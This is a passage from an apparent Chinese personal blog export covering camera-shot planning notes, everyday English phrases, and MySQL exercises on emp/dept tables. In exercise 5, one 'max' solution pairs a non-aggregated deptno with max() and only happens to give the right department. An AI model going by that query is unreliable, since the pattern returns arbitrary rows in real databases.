<p>step 8 镜头从后方向右缓慢平移造就伤感镜头、cut</p>
<p><img src="https://img-blog.csdnimg.cn/20201027145403449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
</blockquote>
<h2 id="第二个场景"><a href="#第二个场景" class="headerlink" title="第二个场景"></a>第二个场景</h2><p>地点：一处有楼梯的地方</p>
<p>拍摄方式：</p>
<blockquote>
<p>step 1 低角度跟拍缓步前行，镜头向上拉伸保持平缓，直到角色上楼梯将镜头向下拉伸cut<br><img src="https://img-blog.csdnimg.cn/20201027145423446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 2 镜头蹲下然后缓慢站起来，聚焦到人物身上保持镜头不变cut<br><img src="https://img-blog.csdnimg.cn/20201027145307636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 3 从左往右来一个升格cut<br><img src="https://img-blog.csdnimg.cn/20201027145540863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 4 由近到远</p>
<p><img src="https://img-blog.csdnimg.cn/20201027145700189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 5 场景转向上楼梯，镜头跟随角色向上进行固定航拍(角色微笑)并且同时镜头向后拉，再向前，进行cut</p>
<p><img src="https://img-blog.csdnimg.cn/20201027145949429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201027145955720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 6 由远到近向上拉和向下拉镜头cut</p>
<p><img src="https://img-blog.csdnimg.cn/20201027150025942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 7 进行镜头左右固定角色中心cut</p>
<p><img src="https://img-blog.csdnimg.cn/20201027150154978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/2020102715020449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 8 拉近镜头 聚焦中心人物侧颜<br><img src="https://img-blog.csdnimg.cn/20201027150404904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 9 镜头转远向后右拉伸</p>
<p><img src="https://img-blog.csdnimg.cn/20201027150348764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 9 镜头转换由下向上，人物中心聚焦，人物转圈跟拍<br><img src="https://img-blog.csdnimg.cn/20201027150635743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201027150703800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 10 一直跟着角色轻微向右边移动镜头，接着将镜头向上拉转场</p>
<p><img src="https://img-blog.csdnimg.cn/20201027150905811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 11 从角色后左方进行进行缓慢移动 </p>
<p><img src="https://img-blog.csdnimg.cn/20201027153051531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 12 近距离拍摄角色左侧颜,向角色右边缓移接着向下和向上cut<br><img src="https://img-blog.csdnimg.cn/20201027153140680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 13 从后面的右边向左边转镜头 ，渐渐向后平移 cut<br><img src="https://img-blog.csdnimg.cn/20201027153304196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201027153333885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 14 后面跟拍人物跳动镜头，并且后期进行减慢速度前行造成悲伤感觉<br><img src="https://img-blog.csdnimg.cn/20201027153457496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201027153503112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201027153724523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 15 从人物左边拍摄侧颜进行慢速度后期镜头平移，接着角色转身，面向镜头镜头微笑</p>
<p><img src="https://img-blog.csdnimg.cn/20201027153752214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20201027153804525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 16 从角色身后拍摄，镜头向后缓慢拉，并且角色再转头</p>
<p><img src="https://img-blog.csdnimg.cn/20201027153913790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201027153927417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 17 角色行动跟拍 慢动作</p>
<p><img src="https://img-blog.csdnimg.cn/20201027154148870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>step 18 进行角色侧颜笑脸拍摄<br><img src="https://img-blog.csdnimg.cn/20201027154137225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>step 18 从角色后方进行向后拍摄 并且拉近镜头<br><img src="https://img-blog.csdnimg.cn/20201027154249158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>last one 镜头和开头一样从下往上侧脸拉升 结束cut<br><img src="https://img-blog.csdnimg.cn/20201027154322658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
</blockquote>
]]></content>
      <categories>
        <category>摄影</category>
      </categories>
      <tags>
        <tag>镜头</tag>
      </tags>
  </entry>
  <entry>
    <title>Monster的口语方法</title>
    <url>/2020/10/26/Monster%E7%9A%84%E5%8F%A3%E8%AF%AD%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、主题式句子积累"><a href="#一、主题式句子积累" class="headerlink" title="一、主题式句子积累"></a>一、主题式句子积累</h1><blockquote>
<p><strong>去洗手间</strong></p>
<p>Excuse me, I need to go to the restroom\bathroom.</p>
<p>I wonder if I can go somewhere?</p>
<p>Can you tell me where the powder room is?<br>Powder room 补粉的房间</p>
<p>Excuse me, where can I wash my hands?</p>
<p>where’s john?</p>
<p>Nature calls me.天性在召唤我</p>
</blockquote>
<blockquote>
<p>I will always remember you. 我会永远记住你<br>I run into some problems. 我遇到一些问题<br>gorgeous\good-looking 他很帅<br>tasty 菜很好吃<br>not bad 一般般<br>after you \ go ahead 你先走<br>How are you doing? 你吃了没有<br>I’ve eaten 我吃过了<br>eat soup 喝汤<br>take medicine 吃药</p>
</blockquote>
<blockquote>
<p>想要干什么：Would you like to<br>唱歌：go singing\go to karaoke<br>I’d love to, but I’m not good at singing. = I’m not a good singer.<br>五音不全：I’m tone-deaf.<br>我唱歌老跑调：I can never sing in tune.\ I sing out of tune.</p>
<p>我没勇气在别人面前唱歌<br>I don’t have the nerve to sing in front of people</p>
<p>How about a drink?</p>
<p>Would you like to have a drink.</p>
<p>I get drunk easily.<br>I’m a light drinker.<br>I’m heavy drinker.<br>I can drink like a fish</p>
</blockquote>
<blockquote>
<p>see a doctor 看医生<br>what’s the matter. 你怎么了<br>what’s wrong with you?<br>what are you symptoms? 症状</p>
<p>I feel sluggish./ I feel tired. 浑身没劲<br>I feel dizzy. 我头晕目眩<br>I have a runny nose.流鼻涕<br>I feel like throwing up. 我想吐<br>I have a headache. 我头痛<br>My head is pounding.头痛<br>I have a splitting headache.我的头要裂了</p>
</blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>英语四级</tag>
      </tags>
  </entry>
  <entry>
    <title>MYSQL——27道练习题</title>
    <url>/2020/10/15/MYSQL%E2%80%94%E2%80%9427%E9%81%93%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1、取得每个部门最高薪水的人员名称"><a href="#1、取得每个部门最高薪水的人员名称" class="headerlink" title="1、取得每个部门最高薪水的人员名称"></a>1、取得每个部门最高薪水的人员名称</h1><p><em>第一步：取得每个部门最高薪水</em>(按照部门编号分组找出每一个部门最大值)</p>
<pre><code>select 
    deptno,max(sal) maxsal 
from 
    emp 
group by 
    deptno;</code></pre><p>+——–+———-+<br>| deptno | maxsal   |<br>+——–+———-+<br>|     10 |  5000.00 |<br>|     20 |  3000.00 |<br>|     30 |  2850.00 |<br>+——–+———-+<br>第二步：自连接（将以上的查询结果当做一张临时表t，t和emp表连接，条件:t.deptno=e.deptno and t.maxsal = e.sal)</p>
<pre><code>select 
    e.ename,t.* 
from 
    emp e 
join 
    (select deptno,max(sal) maxsal from emp group by deptno) t 
on 
    t.maxsal=e.sal and t.deptno=e.deptno;</code></pre><p>+——-+——–+———+<br>| ename | deptno | maxsal  |<br>+——-+——–+———+<br>| BLAKE |     30 | 2850.00 |<br>| SCOTT |     20 | 3000.00 |<br>| KING  |     10 | 5000.00 |<br>| FORD  |     20 | 3000.00 |<br>+——-+——–+———+</p>
<h1 id="2、哪些人的薪水在部门的平均薪资之上"><a href="#2、哪些人的薪水在部门的平均薪资之上" class="headerlink" title="2、哪些人的薪水在部门的平均薪资之上"></a>2、哪些人的薪水在部门的平均薪资之上</h1><p><em>第一步:找出每个部门的平均薪资</em></p>
<pre><code>select 
    deptno,avg(sal) avgsal
from 
    emp
group by
    deptno;</code></pre><p>+——–+————-+<br>| deptno | avgsal      |<br>+——–+————-+<br>|     10 | 2916.666667 |<br>|     20 | 2175.000000 |<br>|     30 | 1566.666667 |<br>+——–+————-+</p>
<p><em>第二步：将以上查询结果当做t表，t和emp表连接</em><br><strong>条件：部门编号相同，并且emp的sal大于t表的avgsal</strong></p>
<pre><code>select 
    e.ename,t.deptno,e.sal
from 
    emp e 
join
    (select deptno,avg(sal) avgsal from emp group by deptno) t
on
    e.sal&gt;t.avgsal and e.deptno=t.deptno;</code></pre><p>+——-+——–+———+<br>| ename | deptno | sal     |<br>+——-+——–+———+<br>| ALLEN |     30 | 1600.00 |<br>| JONES |     20 | 2975.00 |<br>| BLAKE |     30 | 2850.00 |<br>| SCOTT |     20 | 3000.00 |<br>| KING  |     10 | 5000.00 |<br>| FORD  |     20 | 3000.00 |<br>+——-+——–+———+</p>
<h1 id="3、取得部门中（所有人的）平均的薪资等级"><a href="#3、取得部门中（所有人的）平均的薪资等级" class="headerlink" title="3、取得部门中（所有人的）平均的薪资等级"></a>3、取得部门中（所有人的）平均的薪资等级</h1><blockquote>
<p>平均的薪水等级：先计算每一个薪水的等级，然后找出薪水等级的平均值。<br>平均薪水的等级：先计算平均薪水，然后找出每个平均薪水的等级值。</p>
</blockquote>
<p><em>第一步：找出每个人的薪水等级</em></p>
<pre><code>select
    e.ename,e.sal,e.deptno,s.grade
from
    emp e
join
    salgrade s
on
    e.sal between s.losal and s.hisal
order by
    deptno;</code></pre><p>+——–+———+——–+——-+<br>| ename  | sal     | deptno | grade |<br>+——–+———+——–+——-+<br>| CLARK  | 2450.00 |     10 |     4 |<br>| KING   | 5000.00 |     10 |     5 |<br>| MILLER | 1300.00 |     10 |     2 |<br>| ADAMS  | 1100.00 |     20 |     1 |<br>| SCOTT  | 3000.00 |     20 |     4 |<br>| FORD   | 3000.00 |     20 |     4 |<br>| JONES  | 2975.00 |     20 |     4 |<br>| SMITH  |  800.00 |     20 |     1 |<br>| ALLEN  | 1600.00 |     30 |     3 |<br>| JAMES  |  950.00 |     30 |     1 |<br>| WARD   | 1250.00 |     30 |     2 |<br>| MARTIN | 1250.00 |     30 |     2 |<br>| TURNER | 1500.00 |     30 |     3 |<br>| BLAKE  | 2850.00 |     30 |     4 |<br>+——–+———+——–+——-+</p>
<p><em>基于以上的结果继续按照deptno分组，求grade的平均值</em></p>
<pre><code>select
    e.deptno,avg(s.grade) avggrade
from
    emp e
join
    salgrade s
on
    e.sal between s.losal and s.hisal
group by
    e.deptno;</code></pre><p>+——–+———-+<br>| deptno | avggrade |<br>+——–+———-+<br>|     10 |   3.6667 |<br>|     20 |   2.8000 |<br>|     30 |   2.5000 |<br>+——–+———-+</p>
<h1 id="4、不准用组函数（MAX），取得最高薪水"><a href="#4、不准用组函数（MAX），取得最高薪水" class="headerlink" title="4、不准用组函数（MAX），取得最高薪水"></a>4、不准用组函数（MAX），取得最高薪水</h1><p><em>第一种，降序，limit 1</em></p>
<pre><code>select ename,sal from emp order by sal desc limit 1;</code></pre><p>+——-+———+<br>| ename | sal     |<br>+——-+———+<br>| KING  | 5000.00 |<br>+——-+———+</p>
<p><em>第二种，表的自连接</em></p>
<blockquote>
<p>select sal from emp where sal not in(select distinct a.sal from (select sal from emp) a join (select sal from emp) b on a.sal&lt;b.sal);<br>+———+<br>| sal     |<br>+———+<br>| 5000.00 |<br>+———+<br>select distinct a.sal from (select sal from emp) a join (select sal from emp) b on a.sal&lt;b.sal;<br>a表<br>+———+<br>|  800.00 |<br>| 1600.00 |<br>| 1250.00 |<br>| 2975.00 |<br>| 1250.00 |<br>| 2850.00 |<br>| 2450.00 |<br>| 3000.00 |<br>| 5000.00 |<br>| 1500.00 |<br>| 1100.00 |<br>|  950.00 |<br>| 3000.00 |<br>| 1300.00 |<br>+———+<br>b表<br>+———+<br>|  800.00 |<br>| 1600.00 |<br>| 1250.00 |<br>| 2975.00 |<br>| 1250.00 |<br>| 2850.00 |<br>| 2450.00 |<br>| 3000.00 |<br>| 5000.00 |<br>| 1500.00 |<br>| 1100.00 |<br>|  950.00 |<br>| 3000.00 |<br>| 1300.00 |<br>+———+</p>
</blockquote>
<h1 id="5、取得平均薪水最高的部门的部门编号"><a href="#5、取得平均薪水最高的部门的部门编号" class="headerlink" title="5、取得平均薪水最高的部门的部门编号"></a>5、取得平均薪水最高的部门的部门编号</h1><p><em>第一种方案 //max</em><br><strong>第一步：取得每个部门的平均薪水</strong></p>
<pre><code>select deptno,avg(sal) avgsal from emp group by deptno;</code></pre><p>+——–+————-+<br>| deptno | avgsal      |<br>+——–+————-+<br>|     10 | 2916.666667 |<br>|     20 | 2175.000000 |<br>|     30 | 1566.666667 |<br>+——–+————-+<br><strong>第二步把上表当做临时表，然后用max进行求最大值的部门编号</strong><br>        select t.deptno,max(t.avgsal) maxavgsal from (select deptno,avg(sal) avgsal from emp group by deptno) t;<br>+——–+————-+<br>| deptno | maxavgsal   |<br>+——–+————-+<br>|     10 | 2916.666667 |<br>+——–+————-+</p>
<p><em>第二个方案 //降序取第一个</em><br><strong>第一步：取得每个部门的平均薪水</strong><br><strong>第二步：将上表当做临时表，通过avgsal进行降序排序，然后limit 1取第一行</strong></p>
<pre><code>select deptno,avg(sal) avgsal from emp group by deptno order by avgsal desc limit 1;</code></pre><p>+——–+————-+<br>| deptno | avgsal      |<br>+——–+————-+<br>|     10 | 2916.666667 |<br>+——–+————-+</p>
<h1 id="6、取得平均薪水最高的部门的部门名称"><a href="#6、取得平均薪水最高的部门的部门名称" class="headerlink" title="6、取得平均薪水最高的部门的部门名称"></a>6、取得平均薪水最高的部门的部门名称</h1><p><em>第一步，取得平均薪水最高的部门</em></p>
<pre><code>select avg(sal) 平均薪水, deptno from emp group by deptno order by 平均薪水 desc limit 1;</code></pre><p>+————-+——–+<br>| 平均薪水    | deptno |<br>+————-+——–+<br>| 2916.666667 |     10 |<br>+————-+——–+</p>
<p><em>第二步，取得最高的部门名称</em></p>
<pre><code>select d.dname,t.平均薪水 from dept d join (select avg(sal) 平均薪水, deptno from emp group by deptno order by 平均薪水 desc limit 1) t on d.deptno=t.deptno;</code></pre><p>+————+————-+<br>| dname      | 平均薪水    |<br>+————+————-+<br>| ACCOUNTING | 2916.666667 |<br>+————+————-+</p>
<h1 id="7、求平均薪水的等级最低的部门的部门名称"><a href="#7、求平均薪水的等级最低的部门的部门名称" class="headerlink" title="7、求平均薪水的等级最低的部门的部门名称"></a>7、求平均薪水的等级最低的部门的部门名称</h1><p><em>第一步，求平均薪水的等级最低的部门</em></p>
<pre><code>select t.*,s.grade from salgrade s join (select avg(sal) avgsal, deptno from emp group by deptno) t on t.avgsal between losal and hisal order by grade asc limit 1;</code></pre><p>+————-+——–+——-+<br>| avgsal      | deptno | grade |<br>+————-+——–+——-+<br>| 1566.666667 |     30 |     3 |<br>+————-+——–+——-+</p>
<p><em>第二步，找出部门名称</em><br>        select d.dname, p.grade from dept d join(select t.*,s.grade from salgrade s join (select avg(sal) avgsal, deptno from emp group by deptno) t on t.avgsal between losal and hisal order by grade asc limit 1) p on d.deptno = p.deptno;<br>+——-+——-+<br>| dname | grade |<br>+——-+——-+<br>| SALES |     3 |<br>+——-+——-+</p>
<h1 id="8、取得比普通员工（员工代码没有在mgr字段上出现的）的最高薪水还要高的领导人姓名"><a href="#8、取得比普通员工（员工代码没有在mgr字段上出现的）的最高薪水还要高的领导人姓名" class="headerlink" title="8、取得比普通员工（员工代码没有在mgr字段上出现的）的最高薪水还要高的领导人姓名"></a>8、取得比普通员工（员工代码没有在mgr字段上出现的）的最高薪水还要高的领导人姓名</h1><p><strong>领导</strong><br>        mysql&gt; select distinct mgr from emp;<br>        +——+<br>        | mgr  |<br>        +——+<br>        | 7902 |<br>        | 7698 |<br>        | 7839 |<br>        | 7566 |<br>        | NULL |<br>        | 7788 |<br>        | 7782 |<br>        +——+</p>
<p><em>第一步，求出普通员工的最高薪水</em></p>
<pre><code>select max(sal) from emp where empno not in(select distinct mgr from emp where mgr is not NULL);</code></pre><p>+———-+<br>| max(sal) |<br>+———-+<br>|  1600.00 |<br>+———-+</p>
<p><em>第二步，求出比普通员工最高薪水还高的领导</em><br><strong>比普通员工薪水最高薪水还高的就是领导</strong><br>         select ename,sal from emp where sal&gt;(select max(sal) from emp where empno not in(select distinct mgr from emp where mgr is not NULL));<br>+——-+———+<br>| ename | sal     |<br>+——-+———+<br>| JONES | 2975.00 |<br>| BLAKE | 2850.00 |<br>| CLARK | 2450.00 |<br>| SCOTT | 3000.00 |<br>| KING  | 5000.00 |<br>| FORD  | 3000.00 |<br>+——-+———+</p>
<h1 id="9、取得薪水最高的前五名员工"><a href="#9、取得薪水最高的前五名员工" class="headerlink" title="9、取得薪水最高的前五名员工"></a>9、取得薪水最高的前五名员工</h1><pre><code>select ename,sal from emp order by sal desc limit 0,5;</code></pre><p>+——-+———+<br>| ename | sal     |<br>+——-+———+<br>| KING  | 5000.00 |<br>| FORD  | 3000.00 |<br>| SCOTT | 3000.00 |<br>| JONES | 2975.00 |<br>| BLAKE | 2850.00 |<br>+——-+———+</p>
<h1 id="10、取得薪水最高的第六到第十名员工"><a href="#10、取得薪水最高的第六到第十名员工" class="headerlink" title="10、取得薪水最高的第六到第十名员工"></a>10、取得薪水最高的第六到第十名员工</h1><pre><code>select ename,sal from emp order by sal desc limit 5,5;</code></pre><p>+——–+———+<br>| ename  | sal     |<br>+——–+———+<br>| CLARK  | 2450.00 |<br>| ALLEN  | 1600.00 |<br>| TURNER | 1500.00 |<br>| MILLER | 1300.00 |<br>| WARD   | 1250.00 |<br>+——–+———+</p>
<h1 id="11、取得最后入职的5名员工"><a href="#11、取得最后入职的5名员工" class="headerlink" title="11、取得最后入职的5名员工"></a>11、取得最后入职的5名员工</h1><pre><code>select ename,hiredate from emp order by hiredate desc limit 5;</code></pre><p>+——–+————+<br>| ename  | hiredate   |<br>+——–+————+<br>| ADAMS  | 1987-05-23 |<br>| SCOTT  | 1987-04-19 |<br>| MILLER | 1982-01-23 |<br>| JAMES  | 1981-12-03 |<br>| FORD   | 1981-12-03 |<br>+——–+————+</p>
<h1 id="12、取得每个薪水等级有多少员工"><a href="#12、取得每个薪水等级有多少员工" class="headerlink" title="12、取得每个薪水等级有多少员工"></a>12、取得每个薪水等级有多少员工</h1><p><em>第一步，找出每个员工的薪水等级</em></p>
<pre><code>select e.ename, s.grade from emp e join salgrade s on e.sal between losal and hisal;</code></pre><p>+——–+——-+<br>| ename  | grade |<br>+——–+——-+<br>| SMITH  |     1 |<br>| ALLEN  |     3 |<br>| WARD   |     2 |<br>| JONES  |     4 |<br>| MARTIN |     2 |<br>| BLAKE  |     4 |<br>| CLARK  |     4 |<br>| SCOTT  |     4 |<br>| KING   |     5 |<br>| TURNER |     3 |<br>| ADAMS  |     1 |<br>| JAMES  |     1 |<br>| FORD   |     4 |<br>| MILLER |     2 |<br>+——–+——-+</p>
<p><em>第二步：继续按照grade分组统计数量</em></p>
<pre><code>select count(*), s.grade from emp e join salgrade s on e.sal between losal and hisal group by s.grade;</code></pre><p>+———-+——-+<br>| count(*) | grade |<br>+———-+——-+<br>|        3 |     1 |<br>|        3 |     2 |<br>|        2 |     3 |<br>|        5 |     4 |<br>|        1 |     5 |<br>+———-+——-+</p>
<h1 id="13、面试题"><a href="#13、面试题" class="headerlink" title="13、面试题"></a>13、面试题</h1><blockquote>
<p><strong>有3给表 S（学生表）,C（课程表），SC（学生选课表）S（SNO，SNAME）代号（学号，姓名）</strong><br><strong>C（CNO，CNAME，CTEACHER）代表（课号，课名，教师）</strong><br><strong>SC（SNO，CNO，SCGRADE）代表（学号，课号，成绩）</strong><br><strong>问题：</strong><br><em>1、找出没选过“黎明”老师的所有学生姓名。</em><br><em>2、列出2门以上（含两门）不及格学生姓名及平均成绩。</em><br><em>3、即学过1号课程又学过2号课所有学生的姓名。</em><br><strong>请用标准SQL语言写出答案，方言也行（请说明是使用说明方言）。</strong></p>
</blockquote>
<h1 id="14、列出所有员工及领导的姓名"><a href="#14、列出所有员工及领导的姓名" class="headerlink" title="14、列出所有员工及领导的姓名"></a>14、列出所有员工及领导的姓名</h1><pre><code>select a.ename 员工, b.ename 领导 from emp a left join emp b on a.mgr = b.empno;</code></pre><p>+——–+——-+<br>| 员工   | 领导  |<br>+——–+——-+<br>| SMITH  | FORD  |<br>| ALLEN  | BLAKE |<br>| WARD   | BLAKE |<br>| JONES  | KING  |<br>| MARTIN | BLAKE |<br>| BLAKE  | KING  |<br>| CLARK  | KING  |<br>| SCOTT  | JONES |<br>| KING   | NULL  |<br>| TURNER | BLAKE |<br>| ADAMS  | SCOTT |<br>| JAMES  | BLAKE |<br>| FORD   | JONES |<br>| MILLER | CLARK |<br>+——–+——-+</p>
<h1 id="15、列出受雇日期早于其直接上级的所有员工的编号，姓名，部门名称"><a href="#15、列出受雇日期早于其直接上级的所有员工的编号，姓名，部门名称" class="headerlink" title="15、列出受雇日期早于其直接上级的所有员工的编号，姓名，部门名称"></a>15、列出受雇日期早于其直接上级的所有员工的编号，姓名，部门名称</h1><p><em>第一步，求出员工与其上级员工</em></p>
<pre><code>select a.ename,b.ename from emp a join emp b on a.mgr = b.empno;</code></pre><p>+——–+——-+<br>| ename  | ename |<br>+——–+——-+<br>| SMITH  | FORD  |<br>| ALLEN  | BLAKE |<br>| WARD   | BLAKE |<br>| JONES  | KING  |<br>| MARTIN | BLAKE |<br>| BLAKE  | KING  |<br>| CLARK  | KING  |<br>| SCOTT  | JONES |<br>| TURNER | BLAKE |<br>| ADAMS  | SCOTT |<br>| JAMES  | BLAKE |<br>| FORD   | JONES |<br>| MILLER | CLARK |<br>+——–+——-+</p>
<p><em>第二步，对比a,b两个表hiredate的大小，找出受雇日期早于其领导的人员</em></p>
<pre><code>select a.ename from emp a join emp b on a.mgr = b.empno where a.hiredate&lt;b.hiredate;</code></pre><p>+——-+<br>| ename |<br>+——-+<br>| SMITH |<br>| ALLEN |<br>| WARD  |<br>| JONES |<br>| BLAKE |<br>| CLARK |<br>+——-+</p>
<p><em>第三步，利用自连接dept进行输出dname</em></p>
